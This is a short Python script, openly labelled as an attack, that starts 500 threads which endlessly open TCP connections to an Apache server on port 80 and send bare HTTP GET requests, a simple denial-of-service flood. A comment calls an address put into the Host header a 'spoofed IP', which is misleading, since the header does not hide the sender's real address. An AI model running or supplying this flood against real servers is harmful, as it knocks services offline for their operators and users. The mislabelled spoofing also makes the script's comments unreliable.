import socket
import threading

target = "127.0.0.1"  # Target Apache server
port = 80  # HTTP port
fake_ip = "192.168.1.100"  # Spoofed IP

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

for i in range(500):  # 500 attack threads
    thread = threading.Thread(target=attack)
    thread.start()
